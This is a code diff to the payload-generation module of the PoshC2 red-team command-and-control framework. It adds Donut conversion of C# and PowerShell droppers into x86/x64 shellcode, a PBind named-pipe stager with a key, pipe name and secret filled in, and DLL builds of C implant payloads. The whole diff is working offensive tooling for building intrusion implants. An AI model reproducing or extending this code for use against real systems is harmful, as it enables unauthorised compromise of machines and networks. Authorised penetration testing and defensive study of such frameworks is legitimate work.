@@ -1,5 +1,5 @@
 from io import StringIO
-import gzip, base64, subprocess, os, hashlib, shutil, re
+import gzip, base64, subprocess, os, hashlib, shutil, re, donut
 from enum import Enum
 
 from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, DatabaseType
@@ -150,7 +150,6 @@ class Payloads(object):
 
 
     def CreateDroppers(self, name=""):
-        self.QuickstartLog("C# Dropper DLL written to: %s%sdropper_cs.dll" % (self.BaseDirectory, name))
         self.QuickstartLog("C# Dropper EXE written to: %s%sdropper_cs.exe" % (self.BaseDirectory, name))
 
         with open("%sdropper.cs" % PayloadTemplatesDirectory, 'r') as f:
@@ -171,7 +170,6 @@ class Payloads(object):
         with open("%s%sdropper.cs" % (self.BaseDirectory, name), 'w') as f:
             f.write(str(content))
 
-        subprocess.check_output("mono-csc %s%sdropper.cs -out:%s%sdropper_cs.dll -target:library -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name), shell=True)
         subprocess.check_output("mono-csc %s%sdropper.cs -out:%s%sdropper_cs.exe -target:exe -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name), shell=True)
 
         # Create PBind Sharp DLL
@@ -185,14 +183,10 @@ class Payloads(object):
         with open("%s%spbind.cs" % (self.BaseDirectory, name), 'w') as f:
             f.write(str(content))
 
-        self.QuickstartLog("C# PBind Dropper DLL written to: %s%spbind_cs.dll" % (self.BaseDirectory, name))
-        subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.dll -target:library -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
-
         self.QuickstartLog("C# PBind Dropper EXE written to: %s%spbind_cs.exe" % (self.BaseDirectory, name))
         subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)
 
         os.rename("%sPB.exe" % (self.BaseDirectory), "%s%spbind_cs.exe" % (self.BaseDirectory, name))
-        os.rename("%sPB.dll" % (self.BaseDirectory), "%s%spbind_cs.dll" % (self.BaseDirectory, name))
 
 
     def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
@@ -223,7 +217,9 @@ class Payloads(object):
             out = StringIO()
             with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
                 pbind = f.read()
-            pbind = str(pbind).replace("#REPLACEKEY#", self.Key)
+            pbind = str(pbind).replace("#REPLACEKEY#", self.Key) \
+                    .replace("#REPLACEPBINDPIPENAME#", self.PBindPipeName) \
+                    .replace("#REPLACEPBINDSECRET#", self.PBindSecret)
             data = bytes(pbind, 'utf-8')
             out = gzip.compress(data)
             gzipdata = base64.b64encode(out).decode("utf-8")
@@ -330,8 +326,26 @@ class Payloads(object):
 
 
     def CreateCS(self, name=""):
+        self.QuickstartLog("C# PBind Powershell v4 EXE written to: %s%sdropper_cs_ps_pbind_v4.exe" % (self.BaseDirectory, name))
         self.QuickstartLog("C# Powershell v2 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
-        self.QuickstartLog("C# Powershell v4 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
+        self.QuickstartLog("C# Powershell v4 EXE written to: %s%sdropper_cs_ps_v4.exe" % (self.BaseDirectory, name))        
+
+        with open("%sSharp_Powershell_Runner.cs" % PayloadTemplatesDirectory, 'r') as f:
+            content = f.read()
+
+        with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
+            pbind = f.read()
+            pbind = str(pbind) \
+                .replace("#REPLACEKEY#", self.Key) \
+                .replace("#REPLACEPBINDPIPENAME#", self.PBindPipeName) \
+                .replace("#REPLACEPBINDSECRET#", self.PBindSecret)
+            pbind = base64.b64encode(pbind.encode("utf-8")).decode("utf-8")
+
+        content = content.replace("#REPLACEME#", pbind)
+
+        filename = "%s%sSharp_Posh_PBind_Stager.cs" % (self.BaseDirectory, name)
+        with open(filename, 'w') as f:
+            f.write(content)
 
         with open("%sSharp_Powershell_Runner.cs" % PayloadTemplatesDirectory, 'r') as f:
             content = f.read()
@@ -340,6 +354,7 @@ class Payloads(object):
         with open(filename, 'w') as f:
             f.write(content)
 
+        subprocess.check_output("mono-csc %s%sSharp_Posh_PBind_Stager.cs -out:%s%sdropper_cs_ps_pbind_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)
         subprocess.check_output("mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v2.exe -target:exe -sdk:2 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)
         subprocess.check_output("mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)
 
@@ -438,9 +453,6 @@ class Payloads(object):
 
 
     def CreateEXEFiles(self, sourcefile, payloadtype, name=""):
-        self.QuickstartLog("Payload written to: %s%s%s_%s_x64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
-        self.QuickstartLog("Payload written to: %s%s%s_%s_x86.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
-
         # Get the first URL and the default migration process from the config
         migrate_process = DefaultMigrationProcess
         if "\\" in migrate_process and "\\\\" not in migrate_process:
@@ -519,9 +531,17 @@ class Payloads(object):
         with open("%s%s%s_%s_x86.c" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), 'w') as f:
             f.write(content)
 
-        # Compile the exe
-        subprocess.check_output("x86_64-w64-mingw32-gcc -w %s%s%s_%s_x64.c -o %s%s%s_%s_x64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
-        subprocess.check_output("i686-w64-mingw32-gcc -w %s%s%s_%s_x86.c -o %s%s%s_%s_x86.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
+        # Compile the exe or dll depinding if there is a dllmain and process_attach
+        if sourcefile.lower().endswith(".dll.c"):
+            subprocess.check_output("x86_64-w64-mingw32-gcc -w -shared %s%s%s_%s_x64.c -o %s%s%s_%s_x64.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
+            subprocess.check_output("i686-w64-mingw32-gcc -w -shared %s%s%s_%s_x86.c -o %s%s%s_%s_x86.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
+            self.QuickstartLog("Payload written to: %s%s%s_%s_x64.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
+            self.QuickstartLog("Payload written to: %s%s%s_%s_x86.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
+        else:
+            subprocess.check_output("x86_64-w64-mingw32-gcc -w %s%s%s_%s_x64.c -o %s%s%s_%s_x64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
+            subprocess.check_output("i686-w64-mingw32-gcc -w %s%s%s_%s_x86.c -o %s%s%s_%s_x86.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")), shell=True)
+            self.QuickstartLog("Payload written to: %s%s%s_%s_x64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
+            self.QuickstartLog("Payload written to: %s%s%s_%s_x86.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
 
 
     def CreateMacro(self, name=""):
@@ -645,6 +665,50 @@ class Payloads(object):
                 payload.write(template.read())
 
 
+    def CreateDonutShellcode(self, name=""): 
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("Donut shellcode files:")
+        for Payload in PayloadType:
+            self.CreateDonutShellcodeFile(Payload, name)
+
+
+    def CreateDonutShellcodeFile(self, payloadtype, name=""):  
+        if payloadtype == PayloadType.Posh_v2:
+            sourcefile = "dropper_cs_ps_v2.exe"
+        elif payloadtype == PayloadType.Posh_v4:
+            sourcefile = "dropper_cs_ps_v4.exe"
+        elif payloadtype == PayloadType.PBind:            
+            sourcefile = "dropper_cs_ps_pbind_v4.exe"
+        elif payloadtype == PayloadType.Sharp:
+            sourcefile = "dropper_cs.exe"
+        elif payloadtype == PayloadType.PBindSharp:
+            sourcefile = "pbind_cs.exe"
+
+        shellcode32 = donut.create(file=f"{self.BaseDirectory}{name}{sourcefile}", arch=1)
+        if shellcode32:
+            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x86_Shellcode.bin", 'wb')
+            output_file.write(shellcode32)
+            output_file.close()
+            self.QuickstartLog("Payload written to: %s%s%s_Donut_x86_Shellcode.b64" % (self.BaseDirectory, name, payloadtype.value))
+            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x86_Shellcode.b64", 'w')
+            output_file.write(base64.b64encode(shellcode32).decode("utf-8"))
+            output_file.close()
+            self.QuickstartLog("Payload written to: %s%s%s_Donut_x86_Shellcode.bin" % (self.BaseDirectory, name, payloadtype.value))
+
+        shellcode64 = donut.create(file=f"{self.BaseDirectory}{name}{sourcefile}", arch=2)
+        if shellcode64:
+            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x64_Shellcode.bin", 'wb')
+            output_file.write(shellcode64)
+            output_file.close()
+            self.QuickstartLog("Payload written to: %s%s%s_Donut_x64_Shellcode.b64" % (self.BaseDirectory, name, payloadtype.value))
+
+            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x64_Shellcode.b64", 'w')
+            output_file.write(base64.b64encode(shellcode64).decode("utf-8"))
+            output_file.close()            
+            self.QuickstartLog("Payload written to: %s%s%s_Donut_x64_Shellcode.bin" % (self.BaseDirectory, name, payloadtype.value))
+
+
+
     def CreateAll(self, name=""):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog(Colours.END + "Payloads/droppers using powershell.exe:" + Colours.END)
@@ -665,6 +729,7 @@ class Payloads(object):
         self.CreateEXE(name)
         self.CreateMsbuild(name)
         self.CreateCsc(name)
+        self.CreateDonutShellcode(name)
         self.CreatePython(name)
         self.CreateDynamicCodeTemplate(name)
 
